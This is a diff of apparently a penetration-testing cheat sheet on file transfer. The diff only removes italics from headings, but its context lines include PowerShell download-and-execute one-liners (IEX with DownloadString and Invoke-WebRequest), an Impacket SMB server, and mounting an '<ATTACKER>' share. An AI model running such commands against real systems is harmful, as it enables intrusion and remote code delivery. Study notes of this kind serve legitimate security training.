@@ -12,7 +12,7 @@ cssclasses:
 
 #### File Transfer Servers
 
-##### *HTTP*
+##### HTTP
 
 - ***Simple HTTP Servers***
 
@@ -36,7 +36,7 @@ npx http-server /path/to/project -o -p 1234
 php -S localhost:1234
 ```
 
-##### *SMB*
+##### SMB
 
 ###### *Smbserver (Impacket)*
 
@@ -50,7 +50,7 @@ smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SH
 
 #### Linux File Transfer Agents
 
-##### *HTTP*
+##### HTTP
 
 ###### *Wget*
 
@@ -83,7 +83,7 @@ curl --silent --request GET --location --output "<FILE>" "<URL>" # Long Format
 curl -sX GET -Lo "<FILE>" "<URL>" # Short Format
 ```
 
-##### *SSH*
+##### SSH
 
 If *SSH* access to the target is available, proceed as follows →
 
@@ -105,7 +105,7 @@ put /path/to/local/resource
 exit
 ```
 
-##### *Base64*
+##### Base64
 
 > ***[Man Page](https://linux.die.net/man/1/base64)***
 
@@ -121,7 +121,7 @@ base64 -w 0 /path/to/local/resource
 base64 -d <<< "BASE64_STRING" > /destination/path
 ```
 
-##### *File Transfer Validation*
+##### File Transfer Validation
 
 ###### *Check File Type transferred*
 
@@ -144,7 +144,7 @@ sha512sum <FILE>
 
 #### Windows File Transfer Agents
 
-##### *HTTP*
+##### HTTP
 
 ###### *Certutil.exe*
 
@@ -192,7 +192,7 @@ IEX (IWR -UseBasicParsing -Uri '<URL>') # Or Invoke-Expression (Invoke-WebReques
 IEX (New-Object Net.WebClient).DownloadString('<URL>')
 ```
 
-##### *SMB*
+##### SMB
 
 First, an [[#*SMB*|SMB Server]] has to be deployed at one of the endpoints
 
@@ -221,7 +221,7 @@ New-PSDrive -Name <NAME> -PSProvider FileSystem -Root "\\<ATTACKER>\<SHARE_NAME>
 > ```
 >
 
-##### *Base64*
+##### Base64
 
 ###### *Encode the file content to Base64*
 
